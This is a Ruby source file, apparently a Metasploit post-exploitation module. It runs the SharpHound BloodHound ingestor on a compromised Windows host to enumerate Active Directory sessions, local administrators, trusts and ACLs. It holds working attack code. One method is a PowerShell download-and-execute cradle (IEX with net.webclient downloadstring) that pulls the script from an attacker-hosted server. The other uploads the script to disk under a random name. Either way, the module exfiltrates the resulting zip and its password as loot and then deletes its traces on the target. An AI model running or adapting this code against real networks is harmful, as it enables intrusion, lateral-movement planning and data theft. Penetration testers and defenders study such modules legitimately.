class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'BloodHound Ingestor',
      'Description'   => %q{
        This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more.
        With this information BloodHound will easily identify highly complex attack paths that would otherwise be impossible to quickly
        identify within an Active Directory environment.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'h4ng3r <h4ng3r@computerpirate.me>',
          'h00die'
        ],
      'References'    => [ 'URL', 'https://github.com/BloodHoundAD/BloodHound/' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))

    register_options([
      OptString.new('CollectionMethod', [true, 'The collection method to use. This parameter accepts a comma separated list of values. Accepted values are Default, Group, LocalAdmin, RDP, DCOM, GPOLocalGroup, Session, ObjectProps, ComputerOnly, LoggedOn, Trusts, ACL, Container, DcOnly, All', 'Default']),
      OptString.new('Domain', [false, 'Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies']),
      OptBool.new('SearchForest', [true, 'Expands data collection to include all domains in the forest.', false]),
      OptBool.new('Stealth', [true, 'Use stealth collection options, will sacrifice data quality in favor of much reduced network impact', false]),
      OptBool.new('SkipGCDeconfliction', [true, 'Skips Global Catalog deconfliction during session enumeration. This option can result in more inaccuracy in data.', false]),
      OptBool.new('ExcludeDC', [true, 'Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior', false]),
      OptString.new('OU', [false, 'Limit enumeration to this OU. Takes a DistinguishedName.']),
      OptString.new('DomainController', [false, 'Specify which Domain Controller to request data from. Defaults to closest DC using Site Names']),
      OptInt.new('LdapPort', [false, 'Override the port used to connect to LDAP']),
      OptBool.new('SecureLdap', [false, 'Uses LDAPs instead of unencrypted LDAP on port 636']),
      OptBool.new('IgnoreLdapCert', [true, 'Ignores the certificate for LDAP', false]),
      OptString.new('LDAPUser', [false, 'User to connect to LDAP with', 'Default']),
      OptString.new('LDAPPass', [false, 'Password for user you are connecting to LDAP with']),
      OptString.new('DisableKerbSigning', [false, 'Disables Kerberos Signing on requests.', false]),
      OptInt.new('Threads', [true, 'Specifies the number of threads to use during enumeration', 10]),
      OptInt.new('PingTimeout', [true, 'Specifies timeout for ping requests to computers in milliseconds', 250]),
      OptBool.new('SkipPing', [false, 'Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of being up Use this option if ping is disabled on the network for some reason', false]),
      OptInt.new('LoopDelay', [true, 'Amount of time to wait between session enumeration loops in minutes. This option should be used in conjunction with the SessionLoop enumeration method.', 300]),
      OptString.new('MaxLoopTime', [false, 'Length of time to run looped session collection. Format: 0d0h0m0s or any variation of this format. Use in conjunction with -CollectionMethod SessionLoop. Default will loop for two hours']),
      OptPath.new('JSONFolder', [false, 'Folder to write json output to.  Default is Windows temp']),
      OptEnum.new('Method', [true, 'Method to run Sharphound with', 'download', ['download', 'disk']]),
      OptBool.new('EncryptZip', [false, 'If the zip should be password protected', true]),
      OptBool.new('NoSaveCache', [false, 'Dont save the cache file to disk', true]),
    ])

  end

  def sharphound
    File.join(Msf::Config.data_directory, "post", "powershell", "SharpHound.ps1")
  end

  def on_request_uri(cli, _request)
    base_script = File.read(sharphound)
    send_response(cli, base_script)
  end

  def download_run
    start_service()
    uri = get_uri()
    "IEX (new-object net.webclient).downloadstring('#{uri}')"
  end

  def disk_run
    # first test if we can bypass execution policy, aka we're an admin. If not, no reason to continue
    #vprint_status('Testing if we can bypass the execution policy')
    #process, _pid, _c = execute_script("Set-ExecutionPolicy RemoteSigned")
    #sleep 2
    #line = process.channel.read
    #if line =~ /System\.UnauthorizedAccessException/
    #  fail_with(Failure::BadConfig, "Admin privileges required for Method disk.  Try Method download if connectivity exists.")
    #end

    name = "#{pwd}\\#{Rex::Text.rand_text_alpha_lower(4..10)}.ps1"
    vprint_status "Uploading sharphound.ps1 as #{name}"
    upload_file(name, sharphound)
    return ". #{name}", name
  end

  def run
    if not have_powershell?
      fail_with(Failure::Unknown, "PowerShell is not installed")
    end

    extra_params = ""
    if datastore['Domain']
      extra_params += "-Domain #{datastore['Domain']} "
    end
    if datastore['SearchForest']
      extra_params += "-SearchForest "
    end
    if datastore['Stealth']
      extra_params += "-Stealth "
    end
    if datastore['SkipGCDeconfliction']
      extra_params += "-SkipGCDeconfliction "
    end
    if datastore['ExcludeDC']
      extra_params += "-ExcludeDC "
    end
    if datastore['OU']
      extra_params += "-OU #{datastore['OU']} "
    end
    if datastore['DomainController']
      extra_params += "-DomainController #{datastore['DomainController']} "
    end
    if datastore['LdapPort']
      extra_params += "-LdapPort #{datastore['LdapPort']} "
    end
    if datastore['SecureLdap']
      extra_params += "-SecureLdap "
    end
    if datastore['IgnoreLdapCert']
      extra_params += "-IgnoreLdapCert "
    end
    if datastore['SkipPing']
      extra_params += "-SkipPing "
    end
    if datastore['EncryptZip']
      extra_params += "-EncryptZip "
    end
    if datastore['NoSaveCache']
      extra_params += '-NoSaveCache '
    end
    if datastore['MaxLoopTime']
      if datastore['MaxLoopTime'] !~ /^[0-9]+[smdh]/i
        raise Msf::OptionValidateError.new(['MaxLoopTime'])
      end
      extra_params += "-MaxLoopTime #{datastore['MaxLoopTime']} "
    end

    # these options are only added if they aren't the sharphound default
    unless datastore['Threads'].to_i == 10
      extra_params += "-Threads #{datastore['Threads']}"
    end
    unless datastore['PingTimeout'].to_i == 250
      extra_params += "-PingTimeout #{datastore['PingTimeout']}"
    end
    unless datastore['LoopDelay'].to_i == 300
      extra_params += "-LoopDelay #{datastore['LoopDelay']}"
    end
    unless datastore['CollectionMethod'] == 'Default'
      extra_params += "-CollectionMethod #{datastore['CollectionMethod']}"
    end
    tmp_path = datastore['JSONFolder'] ? datastore['JSONFolder'] : get_env('TEMP')

    if datastore['Method'] == 'download'
      command = download_run
    elsif datastore['Method'] == 'disk'
      command, filename = disk_run
    end
    invoker = "Invoke-BloodHound -JSONFolder \"#{tmp_path}\" -ZipFileName hello #{extra_params}"
    print_status("Loading BloodHound with: #{command}")
    print_status("Invoking BloodHound with: #{invoker}")
    process, _pid, _c = execute_script("#{command}; #{invoker}")

    while (line = process.channel.read)
        line.split("\n").map { |s| print_status(s) }
        m = line.match(/Compressing data to (.*\.zip)/)
        sleep 60 # a final wait just in case we caught the text prior to the zip happening
        if m
          zip_path = m[1]
          p = store_loot("windows.ad.bloodhound", "application/zip", session, read_file(zip_path), filename=nil, info=nil, service=nil)
          rm_f(zip_path)
          print_good("Downloaded #{zip_path}: #{p}")
          # the line *after* 'Compressing data to...' is the zip password.
          if datastore['EncryptZip']
            zipPass = nil
            unless line =~ /Password for Zip file is (?<zipPass>.*).  Unzip files manually to upload to interface/
              # try one last time incase we hit right after the zip statement, but before the password statement
              process.channel.read =~ /Password for Zip file is (?<zipPass>.*).  Unzip files manually to upload to interface/
            end
            print_good "Zip password: #{zipPass}"
            report_note(:host => session, :data => "Bloodhound/Sharphound loot #{p} password is #{zipPass}")
          end
          break
        end
    end

    if datastore['Method'] == 'disk'
      vprint_status "Deleting #{filename}"
      rm_f filename
    end
  end

end
